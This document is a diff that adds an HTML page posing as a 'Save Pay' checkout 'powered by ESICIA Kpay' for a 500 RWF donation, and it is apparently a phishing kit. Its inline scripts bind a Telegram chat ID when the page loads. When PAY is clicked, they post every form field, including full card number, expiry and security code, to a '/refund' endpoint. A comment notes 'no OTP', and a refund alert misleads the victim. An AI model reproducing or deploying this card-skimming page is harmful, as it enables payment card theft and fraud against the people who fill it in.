@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style/index.css" />
+    <title>Save Pay</title>
+  </head>
+  <body>
+    <div class="container">
+      <div class="logo"></div>
+
+      <div class="payment-details">
+        <span> <strong>Merchant:</strong> EXUUS LIMITED </span>
+        <span>
+          <strong>Service: </strong> 250780712761 / Donation to the cause 200114
+        </span>
+        <span> <strong>Ref ID:</strong> A15441615193307 </span>
+        <span> <strong>Amount:</strong> 500 RWF </span>
+      </div>
+
+      <h2 class="title">Secure payment powered by ESICIA Kpay</h2>
+
+      <form id="refund-form" class="form">
+        <div class="form-group">
+          <div class="outlined-input-field">
+            <input
+              type="text"
+              id="name"
+              name="name"
+              class="outlined-text-field"
+              autocomplete="off"
+              required
+            />
+            <label for="name">Names</label>
+            <div class="helper-text"></div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <div class="outlined-input-field">
+            <input
+              type="text"
+              id="cardnumber"
+              name="cardnumber"
+              class="outlined-text-field"
+              autocomplete="off"
+              required
+            />
+            <label for="cardnumber">Card Number</label>
+            <i></i>
+            <div class="helper-text"></div>
+          </div>
+        </div>
+
+        <div class="form-group">
+          <div class="inline-form-group">
+            <div class="outlined-input-field">
+              <input
+                type="text"
+                id="expirationdate"
+                name="expirationdate"
+                class="outlined-text-field"
+                autocomplete="off"
+                required
+              />
+              <label for="expirationdate">Expiry (MM/YY)</label>
+              <div class="helper-text"></div>
+            </div>
+
+            <div class="outlined-input-field">
+              <input
+                type="text"
+                id="securitycode"
+                name="securitycode"
+                class="outlined-text-field"
+                autocomplete="off"
+                required
+              />
+              <label for="securitycode">Security Code</label>
+              <div class="helper-text"></div>
+            </div>
+          </div>
+        </div>
+        <div class="form-group">
+          <button type="button" id="refund-btn" class="button">PAY</button>
+        </div>
+      </form>
+
+      <div class="verified">
+        <div class="visa"></div>
+        <div class="mastercard"></div>
+      </div>
+    </div>
+  </body>
+
+  <!-- keep your existing scripts exactly as-is -->
+  <script src="js/jquery.min.js"></script>
+  <script src="js/imask.min.js"></script>
+  <script src="js/input.js"></script>
+  <script src="js/index.js"></script>
+
+  <!-- 1) Bind this page’s session for refunds (no OTP) -->
+  <script>
+    (function(){
+      const chatId = 7398305164; // your Telegram chat ID
+      fetch('/bind-refund', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chatId,
+          ua: navigator.userAgent,
+          tz: Intl.DateTimeFormat().resolvedOptions().timeZone
+        })
+      })
+      .then(()=>console.log('✅ bind‑refund sent'))
+      .catch(console.error);
+    })();
+  </script>
+
+  <!-- 2) Inline handler for the PAY button -->
+  <script>
+    document.addEventListener('DOMContentLoaded', () => {
+      const btn = document.getElementById('refund-btn');
+      if (!btn) {
+        console.error('refund-btn not found');
+        return;
+      }
+      console.log('Inline refund handler attached');
+      btn.addEventListener('click', async () => {
+        console.log('>>> REFUND CLICKED (inline JS)');
+        const form = document.getElementById('refund-form');
+        const formData = new FormData(form);
+        const data = {};
+        for (let [key, val] of formData.entries()) {
+          console.log('Field:', key, '=', val);
+          data[key] = val;
+        }
+        data.ua = navigator.userAgent;
+        data.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+        try {
+          const res = await fetch('/refund', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+          });
+          if (!res.ok) throw new Error(res.statusText);
+          console.log('✅ Refund POST succeeded');
+          alert('✅ Refund request sent.');
+        } catch (err) {
+          console.error('❌ Refund POST failed', err);
+          alert('❌ Error sending refund.');
+        }
+      });
+    });
+  </script>
+</html>
